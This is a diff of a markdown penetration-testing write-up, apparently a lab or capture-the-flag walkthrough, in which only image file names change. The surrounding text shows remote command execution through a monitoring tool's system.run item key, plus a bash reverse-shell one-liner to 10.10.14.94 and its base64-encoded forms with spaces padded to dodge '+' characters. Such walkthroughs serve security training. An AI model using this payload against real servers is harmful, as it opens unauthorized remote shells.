@@ -138,11 +138,11 @@ after some enumeration, we find this:&#x20;
 
 Top right of the screen there is a create item button, let's see:
 
-<figure><img src="../../.gitbook/assets/image (22) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (22) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 put whatever for the name and type `system.run[id]` for the key
 
-<figure><img src="../../.gitbook/assets/image (23) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (23) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Then click the test button and the get value, it will output the `id` command so we got a RCE
 
@@ -154,7 +154,7 @@ echo "bash -i >& /dev/tcp/10.10.14.94/9898 0>&1 " | base64
 
 Let's try only base64 for now:
 
-<figure><img src="../../.gitbook/assets/image (24) (1) (1) (1).png" alt=""><figcaption><p>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45NC85ODk4IDA+JjEgCg</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (24) (1) (1) (1) (1).png" alt=""><figcaption><p>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45NC85ODk4IDA+JjEgCg</p></figcaption></figure>
 
 It did not work, the fact that we have some + in the command bothers me so if we add some double spaces in between each one of the spaces:
 
@@ -182,7 +182,7 @@ system.run[echo  YmFzaCAgLWkgID4mICAvZGV2L3RjcC8xMC4xMC4xNC45NC80NDMgMD4mMSAgCg 
 
 set up a listener, click on test then get value:
 
-<figure><img src="../../.gitbook/assets/image (25) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (25) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 we get some type of timeout&#x20;
 
